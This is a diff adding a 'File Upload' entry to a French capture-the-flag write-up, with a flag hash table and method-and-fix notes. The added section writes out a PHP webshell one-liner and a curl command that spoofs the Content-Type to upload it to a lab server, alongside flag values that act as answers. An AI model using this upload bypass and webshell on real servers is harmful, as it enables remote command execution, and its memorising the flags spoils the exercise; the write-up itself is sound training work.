@@ -11,6 +11,7 @@
 | 7 | User-Agent and Referer Check | f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 |
 | 8 | Survey Vote Tampering | 03a944b434d5baff05f46c4bede5792551a |
 | 9 | Redirect XSS | b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3 |
+| 10 | File Upload|46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
 
 ---
 
@@ -150,3 +151,20 @@
 4. Le payload exploite le paramètre de redirection pour déclencher l'affichage du flag
 
 **Fix** : Ne jamais laisser un paramètre de redirection accepter des schémas arbitraires comme `javascript:`. Restreindre strictement les destinations à une liste blanche de domaines ou de chemins internes et valider côté serveur.
+
+### Breach 10 - File Upload
+**Flag** : `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
+
+**Vulnerabilité** : Unrestricted File Upload (OWASP A04)
+
+**Méthode** :
+1. `/?page=upload` expose un formulaire d'upload qui valide uniquement le Content-Type HTTP,
+   pas le contenu réel du fichier
+2. Création d'un webshell PHP minimal : `echo '<?php system("id"); ?>' > shell.php`
+3. Upload en forçant le Content-Type à `image/jpeg` via curl :
+   `curl -F "MAX_FILE_SIZE=100000" -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.103/?page=upload"`
+4. Le serveur accepte le fichier et retourne directement le flag
+
+**Fix** : Vérifier la vraie signature du fichier (magic bytes), pas uniquement le Content-Type.
+Stocker les fichiers uploadés hors du webroot ou avec une extension neutre pour empêcher
+leur exécution par le serveur.
